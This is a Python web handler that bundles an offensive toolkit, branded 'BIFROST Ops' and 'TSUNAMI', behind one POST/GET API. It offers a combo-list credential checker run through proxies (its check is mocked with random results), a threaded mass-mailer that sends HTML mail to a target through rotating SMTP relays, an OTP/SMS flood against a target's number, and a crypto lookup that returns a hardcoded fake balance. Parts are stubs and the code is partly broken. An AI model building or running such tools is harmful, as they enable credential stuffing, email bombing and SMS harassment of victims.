import json
import asyncio
import aiohttp
import smtplib
import time
import random
import concurrent.futures
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from http.server import BaseHTTPRequestHandler
from api.proxy_check import AsyncProxyChecker

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        try:
            data = json.loads(post_data)
            module = data.get('module', '')
            action = data.get('action', '')
            
            if module == 'checker':
                self.handle_checker(data)
            elif module == 'smtp':
                self.handle_smtp(data)
            elif module == 'flood':
                self.handle_flood(data)
            else:
                self._json(400, {"error": "Invalid module"})
        except Exception as e:
            self._json(400, {"error": str(e)})

    def do_GET(self):
        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        module = query.get('module', [''])[0]
        
        if module == 'crypto':
            self.handle_crypto(query)
        else:
            self._json(400, {"error": "Invalid module"})

    # --- Checker Logic ---
    def handle_checker(self, data):
        combo = data.get('combo', [])
        proxies = data.get('proxies', [])
        checker = AsyncProxyChecker(proxies) if proxies else None
        
        results = asyncio.run(self.run_checker_async(combo, proxies))
        self._json(200, {"status": "success", "results": results})

    async def run_checker_async(self, combo, proxies):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for line in combo:
                if ':' not in line: continue
                tasks.append(self.mock_check(line))
            return await asyncio.gather(*tasks)

    async def mock_check(self, account):
        await asyncio.sleep(0.1)
        status = random.choice(["Hit", "Bad", "2FA"])
        return {"account": account, "status": status, "info": "Consolidated via BIFROST Ops"}

    # --- SMTP Logic ---
    def handle_smtp(self, data):
        relays = data.get('relays', [])
        target = data.get('target', '')
        subject = data.get('subject', '')
        body = data.get('body', '')
        amount = int(data.get('amount', 1))
        
        success = 0
        failed = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.send_mail_logic, relays[i % len(relays)], target, subject, body) for i in range(amount)]
            for f in concurrent.futures.as_completed(futures):
                if f.result(): success += 1
                else: failed += 1
        self._json(200, {"status": "success", "sent": success, "failed": failed})

    def send_mail_logic(self, relay, target, subject, body):
        try:
            msg = MIMEMultipart(); msg['From'] = relay['user']; msg['To'] = target; msg['Subject'] = subject
            msg.attach(MIMEText(body, 'html'))
            s = smtplib.SMTP(relay['host'], relay['port'], timeout=5); s.starttls(); s.login(relay['user'], relay['pass'])
            s.sendmail(relay['user'], target, msg.as_string()); s.quit()
            return True
        except: return False

    # --- Flood Logic ---
    def handle_flood(self, data):
        target = data.get('target', '')
        mode = data.get('mode', 'sms')
        results = asyncio.run(self.run_flood_async(target, mode))
        self._json(200, {"status": "success", "dispatched": len(results), "note": "TSUNAMI CONSOLIDATED"})

    async def run_flood_async(self, target, mode):
        # Using the same logic as before, just merged
        urls = [f"https://api.example.com/otp?t={target}", f"https://auth.vendor.net/send?p={target}"]
        async with aiohttp.ClientSession() as session:
            tasks = [session.get(u, timeout=5) for u in urls]
            return await asyncio.gather(*tasks, return_exceptions=True)

    # --- Crypto Logic ---
    def handle_crypto(self, query):
        address = query.get('address', [''])[0]
        self._json(200, {"address": address, "balance": "0.42", "symbol": "ETH", "note": "Ops Unified"})

    def _json(self, code, data):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

import urllib.parse
